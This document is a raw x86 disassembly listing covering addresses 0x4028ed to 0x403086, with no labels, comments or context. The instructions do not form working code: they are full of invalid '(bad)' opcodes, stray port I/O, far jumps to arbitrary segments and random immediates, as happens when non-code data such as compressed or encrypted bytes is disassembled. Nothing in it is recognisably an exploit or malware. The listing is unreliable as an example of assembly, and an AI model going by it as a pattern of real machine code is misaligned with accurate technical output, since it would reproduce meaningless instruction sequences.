  4028ed:	push   ds
  4028ee:	and    ch,BYTE PTR [edx]
  4028f0:	push   esi
  4028f1:	lahf   
  4028f2:	xor    eax,0x97ec8e10
  4028f7:	mov    WORD PTR [esp+edx*4-0x11],fs
  4028fb:	bound  edx,QWORD PTR [ebx+eiz*2-0x56]
  4028ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402900:	add    BYTE PTR [edx+0x7f],ah
  402903:	cmc    
  402904:	leave  
  402905:	sbb    DWORD PTR [esi+0x52d9f136],edx
  40290b:	xor    DWORD PTR [eax+eiz*4],ebx
  40290e:	loop   0x402970
  402910:	mov    dh,0xd9
  402912:	mov    al,0x58
  402914:	add    dh,BYTE PTR [ecx+ebp*4+0x10157156]
  40291b:	fwait
  40291c:	ins    DWORD PTR es:[edi],dx
  40291d:	ret    0x7f92
  402920:	pop    edx
  402921:	pop    esp
  402922:	mov    ebp,0xd51cce1b
  402927:	sbb    esi,DWORD PTR ds:0xa67e3951
  40292d:	cmp    al,0x67
  40292f:	rcl    DWORD PTR [edx-0x282c28aa],cl
  402935:	inc    esi
  402936:	cld    
  402937:	mov    edi,DWORD PTR [esi-0x77563795]
  40293d:	std    
  40293e:	xchg   DWORD PTR [ecx-0x10c56c5a],ebx
  402944:	jns    0x4029b2
  402946:	cmp    al,0xfa
  402948:	sahf   
  402949:	sahf   
  40294a:	aam    0xc6
  40294c:	adc    ebx,ecx
  40294e:	xor    BYTE PTR [eax+ebp*2],ah
  402951:	pusha  
  402952:	cmp    eax,0x93bd4c16
  402957:	mov    ecx,0xae37b87b
  40295c:	in     eax,0x62
  40295e:	pop    ecx
  40295f:	jne    0x402952
  402961:	jbe    0x4029b4
  402963:	test   BYTE PTR [ebp+0x19f2908b],ch
  402969:	(bad)  
  40296a:	mov    ebx,0x51a8c4c3
  40296f:	pop    ds
  402970:	push   cs
  402971:	bnd jne 0x40291a
  402974:	(bad)  
  402975:	(bad)  
  402976:	pop    eax
  402977:	dec    ecx
  402978:	in     eax,dx
  402979:	and    BYTE PTR [esi+eax*8-0xa],bl
  40297d:	mov    esi,0xf072f229
  402982:	mov    ds:0x75a651ab,al
  402987:	in     al,dx
  402988:	push   esi
  402989:	jmp    0xc7f8ace2
  40298e:	mov    bh,0xbd
  402990:	xchg   edi,eax
  402991:	and    BYTE PTR [ebp+0x6c2bdeb0],dh
  402997:	sub    bh,BYTE PTR [eax-0x1e]
  40299a:	and    DWORD PTR [edi+eax*1],edi
  40299d:	xor    ch,BYTE PTR [edx+0x7b]
  4029a0:	add    BYTE PTR [edi+0x2d01668],cl
  4029a6:	hlt    
  4029a7:	movlps xmm4,QWORD PTR [edx+0x75e92235]
  4029ae:	push   ds
  4029af:	imul   ebp,DWORD PTR [eax-0x7417e7c8],0xffffffd3
  4029b6:	aad    0xb1
  4029b8:	clc    
  4029b9:	cmc    
  4029ba:	mov    ds:0xe411b72c,al
  4029bf:	and    bh,bl
  4029c1:	sbb    edi,DWORD PTR [ecx+0xe1a36ad]
  4029c7:	or     BYTE PTR [ecx],dl
  4029c9:	cmp    al,0xc7
  4029cb:	xchg   BYTE PTR [edi+0x469932f],dh
  4029d1:	or     esp,edi
  4029d3:	or     BYTE PTR [ecx+0x27],dl
  4029d6:	aam    0xa9
  4029d8:	mov    dl,0x98
  4029da:	dec    esi
  4029db:	inc    esi
  4029dc:	dec    eax
  4029dd:	or     dl,dh
  4029df:	lods   eax,DWORD PTR ds:[esi]
  4029e0:	xor    BYTE PTR [esi],0x2b
  4029e3:	mov    ch,0xf3
  4029e5:	nop
  4029e6:	cmp    BYTE PTR [esi-0x675a2010],ch
  4029ec:	fwait
  4029ed:	push   ss
  4029ee:	cwde   
  4029ef:	push   esp
  4029f0:	lods   eax,DWORD PTR ds:[esi]
  4029f1:	xor    DWORD PTR [esi-0x3d],ebx
  4029f4:	ret    0xb62
  4029f7:	xor    eax,DWORD PTR [edx-0x9]
  4029fa:	imul   ebx,ecx,0xc54e7ece
  402a00:	xor    bl,BYTE PTR [ecx-0x6af223d9]
  402a06:	push   ss
  402a07:	cmp    al,0x1f
  402a09:	jne    0x402a62
  402a0b:	jne    0x402a5e
  402a0d:	icebp  
  402a0e:	int3   
  402a0f:	aaa    
  402a10:	xchg   bh,ch
  402a12:	pop    ecx
  402a13:	int3   
  402a14:	enter  0x644f,0x40
  402a18:	iret   
  402a19:	add    edx,ecx
  402a1b:	pop    ebp
  402a1c:	pop    edx
  402a1d:	xor    esp,esi
  402a1f:	scas   eax,DWORD PTR es:[edi]
  402a20:	or     BYTE PTR [edx+0x2be2413a],ch
  402a26:	outs   dx,BYTE PTR ds:[esi]
  402a27:	dec    ecx
  402a28:	out    dx,eax
  402a29:	cli    
  402a2a:	or     ebp,esi
  402a2c:	mov    edx,0x55a4e98e
  402a31:	fldcw  WORD PTR [edx-0x32]
  402a34:	xor    al,0xbf
  402a36:	ins    BYTE PTR es:[edi],dx
  402a37:	sbb    bh,BYTE PTR [edi+eiz*2-0x456ec79]
  402a3e:	jmp    0x4662:0x2b98d64f
  402a45:	pushf  
  402a46:	add    edx,DWORD PTR [edi]
  402a48:	imul   BYTE PTR [ebp+0x530d8704]
  402a4e:	pop    ds
  402a4f:	pop    ecx
  402a50:	mov    edi,0xce53701f
  402a55:	repz out 0x67,al
  402a58:	nop
  402a59:	ins    BYTE PTR es:[edi],dx
  402a5a:	movhps QWORD PTR [ebx],xmm2
  402a5d:	push   ebx
  402a5e:	xor    BYTE PTR [ebx+eiz*8+0x64cba77],0x6f
  402a66:	dec    esp
  402a67:	pop    esi
  402a68:	inc    ecx
  402a69:	push   0x64f0dc6c
  402a6e:	push   esi
  402a6f:	fist   DWORD PTR ds:0xa9a0a9ee
  402a75:	mov    ss,WORD PTR [esi+0x2c1db121]
  402a7b:	sub    dh,BYTE PTR [esi+eiz*4]
  402a7e:	inc    ebp
  402a7f:	dec    ebp
  402a80:	jle    0x402afb
  402a82:	aam    0x16
  402a84:	les    esi,FWORD PTR [edx+0x34e9f38e]
  402a8a:	test   dl,0x46
  402a8d:	(bad)  
  402a8e:	shl    BYTE PTR [ecx+eiz*8+0x2a],1
  402a92:	mov    BYTE PTR [edi+ebx*8+0x35508bb3],ah
  402a99:	or     eax,0xfe47c71c
  402a9e:	(bad)  
  402a9f:	scas   al,BYTE PTR es:[edi]
  402aa0:	xor    esi,DWORD PTR ds:0x48935556
  402aa6:	in     al,dx
  402aa7:	fucomi st,st(1)
  402aa9:	jnp    0x402aa6
  402aab:	cmp    eax,0x56cd731d
  402ab0:	xchg   esp,eax
  402ab1:	mov    ds:0x11fa0dd9,eax
  402ab6:	xor    DWORD PTR [edi],esp
  402ab8:	or     DWORD PTR [ebp-0x77034d67],0x93041629
  402ac2:	jns    0x402a57
  402ac4:	mov    ah,0xc5
  402ac6:	xchg   ebx,eax
  402ac7:	sub    dh,BYTE PTR [esi]
  402ac9:	xchg   ecx,eax
  402aca:	sub    al,0x5b
  402acc:	lds    esp,FWORD PTR [ebx+0x56]
  402acf:	in     al,0xcc
  402ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ad2:	pop    ebp
  402ad3:	(bad)  
  402ad4:	shr    BYTE PTR [edi+0x75],1
  402ad7:	std    
  402ad8:	and    DWORD PTR [ecx],esi
  402ada:	inc    edi
  402adb:	call   0x3a2bd8
  402ae0:	push   ecx
  402ae1:	retf   
  402ae2:	jno    0x402b36
  402ae4:	fs scas al,BYTE PTR es:[edi]
  402ae6:	jp     0x402b4f
  402ae8:	in     al,dx
  402ae9:	inc    edx
  402aea:	inc    esp
  402aeb:	adc    DWORD PTR [ebp-0xf],eax
  402aee:	xchg   ebx,eax
  402aef:	out    0xb7,eax
  402af1:	sahf   
  402af2:	xor    al,0xb4
  402af4:	add    al,0xf8
  402af6:	or     ebp,eax
  402af8:	nop    edi
  402afb:	xchg   ebp,eax
  402afc:	adc    BYTE PTR [edx],0x8d
  402aff:	dec    esi
  402b00:	cmova  ebx,ebx
  402b03:	and    DWORD PTR [esi+0x38],edi
  402b06:	icebp  
  402b07:	ds ret 
  402b09:	mov    BYTE PTR [eax-0x63],0x46
  402b0d:	inc    esp
  402b0e:	or     bh,dl
  402b10:	call   0xbcc56235
  402b15:	mov    bl,0x97
  402b17:	add    al,0xaf
  402b19:	mov    bh,0x44
  402b1b:	mov    ss,WORD PTR [eax+0x74f443e]
  402b21:	es in  al,0x6d
  402b24:	push   0x15
  402b26:	mov    dh,0x77
  402b28:	jmp    0x402b15
  402b2a:	(bad)  
  402b2b:	push   eax
  402b2c:	and    al,0x7c
  402b2e:	(bad)  
  402b2f:	and    BYTE PTR [eax],bl
  402b31:	aad    0x5c
  402b33:	inc    edi
  402b34:	sbb    al,BYTE PTR [edx-0x1816278c]
  402b3a:	das    
  402b3b:	out    dx,al
  402b3c:	and    cl,dl
  402b3e:	adc    eax,0x9659a349
  402b43:	adc    BYTE PTR [eax],bh
  402b45:	xor    DWORD PTR [esi+0x4],esp
  402b48:	and    ecx,0xaf235397
  402b4e:	in     al,0x4d
  402b50:	loop   0x402b88
  402b52:	pop    ebx
  402b53:	cmp    ebp,ebx
  402b55:	ds jmp 0x1cf7:0xab29f151
  402b5d:	je     0x402b4c
  402b5f:	sub    eax,0x379e0696
  402b64:	scas   eax,DWORD PTR es:[edi]
  402b65:	in     eax,dx
  402b66:	sahf   
  402b67:	or     al,0x64
  402b69:	(bad)
  402b6c:	aad    0xcb
  402b6e:	cmp    al,0x56
  402b70:	rol    eax,0x8f
  402b73:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b75:	pop    ecx
  402b76:	dec    ebp
  402b77:	push   es
  402b78:	repnz sub al,0x25
  402b7b:	xor    esp,DWORD PTR [edx+0x34]
  402b7e:	inc    edi
  402b7f:	call   DWORD PTR es:[ebx+0x1a]
  402b83:	test   al,0x47
  402b85:	pop    esi
  402b86:	jnp    0x402b2b
  402b88:	inc    eax
  402b89:	or     esi,DWORD PTR cs:[ecx-0x4c]
  402b8d:	pushf  
  402b8e:	cmp    DWORD PTR [esi+0x25cd1496],edx
  402b94:	ficomp WORD PTR [esi+0x20a8b314]
  402b9a:	lds    ebp,FWORD PTR [edi-0x36]
  402b9d:	xchg   ecx,eax
  402b9e:	jo     0x402bc9
  402ba0:	xor    al,dh
  402ba2:	cmp    eax,DWORD PTR [ebx+esi*8+0x3865cc09]
  402ba9:	add    si,WORD PTR [ecx]
  402bac:	sub    al,0x53
  402bae:	cmp    al,dl
  402bb0:	xchg   ebx,eax
  402bb1:	mov    al,ds:0xf39d1b62
  402bb6:	sahf   
  402bb7:	(bad)  
  402bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bb9:	xchg   esi,eax
  402bba:	lahf   
  402bbb:	shr    DWORD PTR [edi],cl
  402bbd:	cli    
  402bbe:	cmc    
  402bbf:	xor    eax,0x42581c4e
  402bc4:	fadd   st(7),st
  402bc6:	pop    edi
  402bc7:	jge    0x402bb4
  402bc9:	sub    eax,0x6992b2cf
  402bce:	retf   0xf02f
  402bd1:	mov    dl,0xa6
  402bd3:	mov    ds:0x2ca161f9,al
  402bd8:	mov    ecx,0x7a84b098
  402bdd:	push   ds
  402bde:	jl     0x402c23
  402be0:	pop    es
  402be1:	imul   edx,edx,0x2bfb73c3
  402be7:	ds test eax,0x4e181b76
  402bed:	add    DWORD PTR [ebp+0x383f93c8],eax
  402bf3:	ror    DWORD PTR [ebp+ecx*4+0x11481a40],0x85
  402bfb:	inc    ebp
  402bfc:	inc    ebp
  402bfd:	mov    dh,0xea
  402bff:	pop    esi
  402c00:	pushf  
  402c01:	pop    edi
  402c02:	mov    ecx,0xe8a86988
  402c07:	or     dl,al
  402c09:	icebp  
  402c0a:	je     0x402c80
  402c0c:	fild   DWORD PTR ds:0xe0e6dd11
  402c12:	jecxz  0x402be2
  402c14:	dec    edx
  402c15:	sbb    al,0xb2
  402c17:	das    
  402c18:	scas   al,BYTE PTR es:[edi]
  402c19:	(bad)
  402c1e:	call   DWORD PTR [ecx]
  402c20:	xchg   ebp,eax
  402c21:	cmp    BYTE PTR [ebx-0x27],dl
  402c24:	pop    esp
  402c25:	pop    edx
  402c26:	mov    ds:0x9c3d6ddf,al
  402c2b:	mov    ebp,0x8f722762
  402c30:	mov    bh,0x4d
  402c32:	mov    eax,0x4b0d7043
  402c37:	sub    ebx,DWORD PTR [ebp+edi*4+0x40]
  402c3b:	mov    fs,WORD PTR [edx+0x381d80c]
  402c41:	inc    edi
  402c42:	sbb    DWORD PTR [edx+0x55],esi
  402c45:	xchg   esi,eax
  402c46:	cdq    
  402c47:	adc    esp,ebp
  402c49:	stos   BYTE PTR es:[edi],al
  402c4a:	cmp    ah,BYTE PTR [edx]
  402c4c:	xchg   edi,eax
  402c4d:	rol    BYTE PTR [ebp+0x79],1
  402c50:	sahf   
  402c51:	hlt    
  402c52:	jg     0x402c9e
  402c54:	inc    ebp
  402c55:	int    0xbd
  402c57:	jnp    0x402c61
  402c59:	mov    edx,0x294e56e3
  402c5e:	jns    0x402be8
  402c60:	js     0x402cb2
  402c62:	ror    BYTE PTR [edx],1
  402c64:	pop    ebx
  402c65:	mov    bl,0x36
  402c67:	add    DWORD PTR [ecx],ebp
  402c69:	es inc esp
  402c6b:	fsub   DWORD PTR [eax+eax*4+0x7c]
  402c6f:	jecxz  0x402cba
  402c71:	push   eax
  402c72:	inc    ebp
  402c73:	mov    ch,0x6b
  402c75:	mov    esp,0x214c88f1
  402c7a:	jge    0x402cf9
  402c7c:	leave  
  402c7d:	xor    esi,ecx
  402c7f:	add    dh,BYTE PTR [ebx-0x6b5c25dd]
  402c85:	xor    ecx,DWORD PTR [ecx+0x73dab716]
  402c8b:	rcr    DWORD PTR [ecx],1
  402c8d:	add    cl,cl
  402c8f:	or     eax,0x4382ab63
  402c94:	je     0x402c2d
  402c96:	cmp    eax,0xde5c5462
  402c9b:	add    eax,0xbc2ad745
  402ca0:	mov    ds:0x8e57042,al
  402ca5:	mov    edi,0x3a6e5945
  402caa:	sbb    al,0x75
  402cac:	or     DWORD PTR [edi+0xd],eax
  402caf:	cmp    ebp,DWORD PTR [edi-0x4f8f3c00]
  402cb5:	cmp    esp,ebx
  402cb7:	pop    ds
  402cb8:	arpl   dx,dx
  402cba:	int3   
  402cbb:	dec    ecx
  402cbc:	pop    es
  402cbd:	mov    ch,ah
  402cbf:	int3   
  402cc0:	out    dx,al
  402cc1:	add    eax,0x2110ff14
  402cc6:	sub    al,0xce
  402cc8:	cmp    ah,bl
  402cca:	push   ebp
  402ccb:	repz sar DWORD PTR [ebp-0x4e],1
  402ccf:	int3   
  402cd0:	loop   0x402ca6
  402cd2:	pop    es
  402cd3:	stos   BYTE PTR es:[edi],al
  402cd4:	push   0xffffffad
  402cd6:	adc    edi,DWORD PTR [ebp+0x5899718a]
  402cdc:	and    eax,0xe65edaec
  402ce1:	bound  edx,QWORD PTR [edx+0x56]
  402ce4:	js     0x402d1b
  402ce6:	inc    esp
  402ce7:	mov    ecx,0x17eb469a
  402cec:	std    
  402ced:	loopne 0x402d45
  402cef:	push   eax
  402cf0:	dec    edi
  402cf1:	jb     0x402cab
  402cf3:	sub    al,0x58
  402cf5:	mov    WORD PTR ds:0x120be105,ds
  402cfb:	jns    0x402ced
  402cfd:	(bad)  
  402cfe:	js     0x402d20
  402d00:	loopne 0x402d18
  402d02:	retf   
  402d03:	push   ss
  402d04:	or     al,0x26
  402d06:	(bad)
  402d09:	stc    
  402d0a:	push   edx
  402d0b:	mov    bl,0x70
  402d0d:	add    BYTE PTR [edi-0x20],dl
  402d10:	outs   dx,DWORD PTR ds:[esi]
  402d11:	dec    ebx
  402d12:	stos   BYTE PTR es:[edi],al
  402d13:	or     al,BYTE PTR [eax]
  402d15:	cmc    
  402d16:	sbb    bh,BYTE PTR [edi]
  402d18:	push   eax
  402d19:	xchg   edi,eax
  402d1a:	arpl   WORD PTR [eax-0x80],sp
  402d1d:	adc    eax,0xae9e0906
  402d22:	add    ebx,DWORD PTR [esp+eiz*4]
  402d25:	push   ds
  402d26:	mov    BYTE PTR [esi+eiz*2],bh
  402d29:	fsub   DWORD PTR [eax+0x76a056f5]
  402d2f:	dec    eax
  402d30:	push   cs
  402d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d32:	imul   ebx,DWORD PTR [eax],0xfffffffe
  402d35:	sbb    ebx,DWORD PTR [ebp+0x46]
  402d38:	fs daa 
  402d3a:	and    DWORD PTR [ecx+0x4ceeda6],esi
  402d40:	dec    ebp
  402d41:	and    esp,DWORD PTR [ebx]
  402d43:	aam    0x7c
  402d45:	pop    es
  402d46:	(bad)  
  402d48:	push   ebx
  402d49:	gs and al,0xf9
  402d4c:	mov    eax,0xb8a8a04b
  402d51:	sub    ebp,DWORD PTR [edx]
  402d53:	cmp    eax,0x2a1fc626
  402d58:	dec    DWORD PTR [esi]
  402d5a:	cs lock test al,0x1a
  402d5e:	mov    ebp,0x2f959515
  402d63:	je     0x402d5f
  402d65:	jl     0x402daf
  402d67:	add    eax,0x8578f43a
  402d6c:	jae    0x402d74
  402d6e:	lods   eax,DWORD PTR ds:[esi]
  402d6f:	hlt    
  402d70:	jmp    0xabf0dbf8
  402d75:	sub    al,0x47
  402d77:	aaa    
  402d78:	adc    eax,0x821674f1
  402d7d:	and    bh,BYTE PTR [ebx+ebx*8-0x691eed8d]
  402d84:	mov    bh,BYTE PTR [ecx+0x2ff25301]
  402d8a:	inc    esp
  402d8b:	mov    ds:0x87bb21d4,eax
  402d90:	nop
  402d91:	inc    edi
  402d92:	std    
  402d93:	loopne 0x402d5e
  402d95:	js     0x402d92
  402d97:	push   0x47
  402d99:	adc    bh,BYTE PTR [edx+0xd477f18]
  402d9f:	mov    bh,0xe1
  402da1:	imul   BYTE PTR [ebx-0x30]
  402da4:	pop    eax
  402da5:	sbb    BYTE PTR [ebp-0x7f],ah
  402da8:	mov    ds:0x88e25d4f,eax
  402dad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dae:	icebp  
  402daf:	inc    edx
  402db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402db1:	je     0x402dd1
  402db3:	push   ebx
  402db4:	sub    BYTE PTR [ebx],ch
  402db6:	out    0x4a,eax
  402db8:	leave  
  402db9:	push   ecx
  402dba:	ds inc edx
  402dbc:	and    al,0x75
  402dbe:	mov    cl,0xcc
  402dc0:	pop    es
  402dc1:	sub    eax,0xc9b3b6aa
  402dc6:	mov    dl,BYTE PTR [esp+eiz*8]
  402dc9:	iret   
  402dca:	imul   esp,esp,0x59
  402dcd:	cli    
  402dce:	cld    
  402dcf:	inc    esp
  402dd0:	cmp    DWORD PTR ds:0xbe391f73,ebx
  402dd6:	mov    dh,0xda
  402dd8:	mov    ah,0x73
  402dda:	mov    cl,0x87
  402ddc:	imul   edx,DWORD PTR [edx],0xac79847e
  402de2:	mov    ch,ah
  402de4:	stc    
  402de5:	mov    ebx,0xd26f0301
  402deb:	inc    edi
  402dec:	push   ebp
  402ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dee:	pop    ss
  402def:	pop    es
  402df0:	inc    ebx
  402df1:	inc    ecx
  402df2:	lods   al,BYTE PTR ds:[esi]
  402df3:	shl    BYTE PTR [esi-0x7f],1
  402df6:	pop    ecx
  402df7:	sub    DWORD PTR [eax-0x39],eax
  402dfa:	add    BYTE PTR [ecx],ch
  402dfc:	gs arpl dx,sp
  402dff:	das    
  402e00:	test   eax,0xbcb41cd1
  402e05:	jno    0x402d93
  402e07:	or     ch,BYTE PTR [esi]
  402e09:	imul   edx,DWORD PTR [ecx+0x4b],0x6e
  402e0d:	push   edi
  402e0e:	leave  
  402e0f:	dec    edi
  402e10:	fcom   QWORD PTR [ecx+0x32b29fc0]
  402e16:	add    bl,BYTE PTR [ebx+0x6e]
  402e19:	test   BYTE PTR [edi+edx*4],ah
  402e1c:	int3   
  402e1d:	push   ds
  402e1e:	aam    0xc3
  402e20:	stos   DWORD PTR es:[edi],eax
  402e21:	shr    BYTE PTR [edi],0x1d
  402e24:	sbb    DWORD PTR [ebx+0x13133e20],ebx
  402e2a:	xchg   eax,esi
  402e2c:	cmp    eax,0xeeb972a8
  402e31:	fisub  DWORD PTR [ecx+0x6124cf72]
  402e37:	lea    ebx,ds:0x273317df
  402e3d:	or     edx,DWORD PTR [ecx-0x3]
  402e40:	in     al,dx
  402e41:	inc    edi
  402e42:	mov    bl,BYTE PTR [esi]
  402e44:	mov    ebx,0x65a3042f
  402e49:	enter  0xc0b1,0xbd
  402e4d:	adc    ebx,DWORD PTR [eax]
  402e4f:	adc    eax,0xa8c88a90
  402e54:	add    al,0x74
  402e56:	push   edx
  402e57:	ret    
  402e58:	jg     0x402eb7
  402e5a:	inc    edx
  402e5b:	mov    ecx,0xf6e49232
  402e60:	mov    eax,0x381bc79d
  402e65:	add    DWORD PTR [ebx+ebx*4-0x7c8b977],ebx
  402e6c:	cmp    cl,BYTE PTR ds:0xd4a5ab4
  402e72:	ret    0xc782
  402e75:	mov    edi,DWORD PTR [ebx-0x67e54065]
  402e7b:	xchg   edx,eax
  402e7c:	and    al,BYTE PTR [edi+0x5a659fd5]
  402e82:	popf   
  402e83:	or     bh,dl
  402e85:	add    eax,0x21a91ace
  402e8a:	jle    0x402ebe
  402e8c:	push   0x92e909f2
  402e91:	add    bl,BYTE PTR [esi+0x2e]
  402e94:	jno    0x402f0f
  402e96:	mov    eax,ds:0x80469437
  402e9b:	xchg   edi,eax
  402e9c:	into   
  402e9d:	push   esi
  402e9e:	mov    bh,0xce
  402ea0:	jmp    FWORD PTR [edx+0x34]
  402ea3:	fisub  WORD PTR [edx+0x938ba9a]
  402ea9:	or     dh,BYTE PTR [ecx+0xc694359]
  402eaf:	xlat   BYTE PTR ds:[ebx]
  402eb0:	sti    
  402eb1:	xor    al,0xb6
  402eb3:	test   DWORD PTR [ecx],edi
  402eb5:	lds    ecx,FWORD PTR [eax+esi*1-0x20815280]
  402ebc:	xlat   BYTE PTR ds:[ebx]
  402ebd:	adc    bl,ah
  402ebf:	outs   dx,BYTE PTR ds:[esi]
  402ec0:	sti    
  402ec1:	inc    edi
  402ec2:	fs loop 0x402e9b
  402ec5:	cli    
  402ec6:	sbb    DWORD PTR ds:0x9613555e,ebp
  402ecc:	pop    ds
  402ecd:	sbb    al,0x59
  402ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ed0:	(bad)  
  402ed1:	stc    
  402ed2:	cdq    
  402ed3:	fs ja  0x402f1b
  402ed6:	mov    bh,0x81
  402ed8:	inc    edi
  402ed9:	daa    
  402eda:	mov    edi,0x1bc4d93
  402edf:	mov    WORD PTR [esi+esi*1],ss
  402ee2:	pushf  
  402ee3:	jae    0x402f3c
  402ee5:	push   ecx
  402ee6:	icebp  
  402ee7:	add    ebx,ecx
  402ee9:	js     0x402f2e
  402eeb:	inc    esi
  402eec:	mov    esi,0x203fcee8
  402ef1:	ret    
  402ef2:	adc    eax,0x7cd6d2ba
  402ef7:	call   0x7a2b:0x80ef94b8
  402efe:	lea    ebp,[edi+0x1b]
  402f01:	pop    esp
  402f02:	outs   dx,DWORD PTR ds:[esi]
  402f03:	repnz sub eax,0x67
  402f07:	aaa    
  402f08:	sbb    cl,ah
  402f0a:	(bad)  [ebx+0x1e]
  402f0d:	xor    DWORD PTR ds:0xda66a457,0x65b62587
  402f17:	xchg   DWORD PTR [esi+0x15],esp
  402f1a:	push   ebp
  402f1b:	dec    edi
  402f1c:	lahf   
  402f1d:	int    0xa
  402f1f:	jns    0x402ef7
  402f21:	pop    ebx
  402f22:	mov    eax,0x5b437c03
  402f27:	and    DWORD PTR ds:0x79823252,ebp
  402f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f2e:	ret    0xfe1d
  402f31:	xchg   DWORD PTR [edx+0x37],esi
  402f34:	and    bl,BYTE PTR [eax]
  402f36:	in     al,dx
  402f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f38:	les    edi,FWORD PTR [edi]
  402f3a:	jl     0x402f7a
  402f3c:	es std 
  402f3e:	sbb    BYTE PTR [ebx-0x75],0x7c
  402f42:	sbb    al,0x83
  402f44:	repnz (bad) 
  402f46:	jl     0x402f8c
  402f48:	repnz mul DWORD PTR [eax-0x138f5121]
  402f4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f50:	sub    BYTE PTR [ebx-0x5d],dl
  402f53:	inc    eax
  402f54:	jns    0x402edf
  402f56:	pop    ecx
  402f57:	jne    0x402f37
  402f59:	adc    DWORD PTR [eax],ecx
  402f5b:	scas   al,BYTE PTR es:[edi]
  402f5c:	lock xchg edx,eax
  402f5e:	in     eax,dx
  402f5f:	aad    0x1d
  402f61:	(bad)  
  402f62:	neg    DWORD PTR [ebx-0x4d]
  402f65:	xchg   edi,eax
  402f66:	jnp    0x402f99
  402f68:	dec    esi
  402f69:	loopne 0x402f4e
  402f6b:	push   ebp
  402f6c:	stos   BYTE PTR es:[edi],al
  402f6d:	jb     0x402fcf
  402f6f:	mov    edi,0x93868221
  402f74:	push   esp
  402f75:	mov    cl,0x27
  402f77:	lods   eax,DWORD PTR ds:[esi]
  402f78:	mov    edi,0xaf9bbee7
  402f7d:	cli    
  402f7e:	stos   BYTE PTR es:[edi],al
  402f7f:	push   ebx
  402f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f81:	cdq    
  402f82:	(bad)  
  402f83:	repz and BYTE PTR [esi+0x61],ah
  402f87:	jle    0x402f57
  402f89:	imul   esi,esp,0x5f
  402f8c:	(bad)  [edi-0x6a]
  402f8f:	in     al,0xb9
  402f91:	fidiv  DWORD PTR [edi+eiz*2+0x1030486c]
  402f98:	jb     0x402f91
  402f9a:	rcr    BYTE PTR [edx],1
  402f9c:	add    al,0x36
  402f9e:	sub    eax,0x24ac8744
  402fa3:	(bad)  
  402fa4:	out    0xd,al
  402fa6:	sbb    DWORD PTR [eax+0xf399e4e],0x4e4590c6
  402fb0:	repnz xchg ecx,eax
  402fb2:	push   ss
  402fb3:	mov    edi,0x16e47442
  402fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fb9:	test   BYTE PTR [ebx],dl
  402fbb:	or     eax,0x224b4e9b
  402fc0:	mov    ds:0x41518ebd,al
  402fc5:	add    dl,bl
  402fc7:	jp     0x402fe9
  402fc9:	lea    edx,[esi+eax*4]
  402fcc:	jnp    0x402ff9
  402fce:	inc    edi
  402fcf:	xor    BYTE PTR [eax],dl
  402fd1:	pop    eax
  402fd2:	into   
  402fd3:	outs   dx,DWORD PTR ds:[esi]
  402fd4:	inc    ebx
  402fd5:	neg    BYTE PTR [edx]
  402fd7:	aad    0x33
  402fd9:	dec    ecx
  402fda:	scas   al,BYTE PTR es:[edi]
  402fdb:	xchg   edx,eax
  402fdc:	xor    ah,0x76
  402fdf:	lods   al,BYTE PTR ds:[esi]
  402fe0:	jne    0x402ffb
  402fe2:	push   ecx
  402fe3:	push   ss
  402fe4:	(bad)  
  402fe5:	mov    al,ds:0x463d92dd
  402fea:	push   ds
  402feb:	shr    DWORD PTR [edi],0x61
  402fee:	out    0x43,eax
  402ff0:	sti    
  402ff1:	jno    0x402fef
  402ff3:	outs   dx,DWORD PTR ds:[esi]
  402ff4:	mov    edi,0xec31caee
  402ff9:	pop    ecx
  402ffa:	pop    ebx
  402ffb:	xlat   BYTE PTR ds:[ebx]
  402ffc:	fadd   st,st(0)
  402ffe:	sbb    edi,DWORD PTR [ebx+0x5c6e54e1]
  403004:	push   es
  403005:	ret    
  403006:	(bad)  
  403007:	cli    
  403008:	pop    edx
  403009:	xchg   ebx,eax
  40300a:	and    BYTE PTR [eax-0x14],dh
  40300d:	cmp    al,0xf1
  40300f:	pop    edi
  403010:	cli    
  403011:	or     BYTE PTR [ebx],bh
  403013:	cwde   
  403014:	call   0xe640:0xe1b1083f
  40301b:	int    0xc1
  40301d:	inc    esp
  40301e:	shl    BYTE PTR gs:[eax],cl
  403021:	cmp    al,0x83
  403023:	jne    0x403092
  403025:	mov    DWORD PTR [ecx-0x3cd094bc],edi
  40302b:	inc    ecx
  40302c:	sbb    BYTE PTR [eax],0xeb
  40302f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403030:	adc    dh,BYTE PTR [edx+edx*4]
  403033:	ss and al,0xb
  403036:	add    esp,edi
  403038:	jae    0x403034
  40303a:	pop    edx
  40303b:	test   al,0x9d
  40303d:	adc    al,0x14
  40303f:	sti    
  403040:	test   DWORD PTR [edi+0x4429aba1],ebx
  403046:	push   edx
  403048:	jmp    0x4030c2
  40304a:	xchg   ebp,eax
  40304b:	stos   DWORD PTR es:[edi],eax
  40304c:	mov    al,0xb7
  40304e:	pushf  
  40304f:	add    eax,DWORD PTR [eax+0x3f9b5b1e]
  403055:	(bad)  
  403056:	sbb    dh,dh
  403058:	fistp  WORD PTR [ecx-0x67]
  40305b:	aas    
  40305c:	push   cs
  40305d:	cmp    eax,esi
  40305f:	repz sbb DWORD PTR [ecx],ebp
  403062:	(bad)  
  403063:	pop    bp
  403065:	fcom   QWORD PTR [esi]
  403067:	jl     0x403062
  403069:	cmp    ebx,DWORD PTR [ebx+ebp*8-0x5442bc0b]
  403070:	sahf   
  403071:	mov    cx,0xfcb5
  403075:	push   0x10
  403077:	or     esi,DWORD PTR [ecx]
  403079:	mov    ecx,0x8c76ac38
  40307e:	mov    dh,0x26
  403080:	jb     0x403002
  403082:	jbe    0x4030c7
  403084:	(bad)  [edi]
  403086:	mov    ecx,DWORD PTR [edx-0x763e2d36]
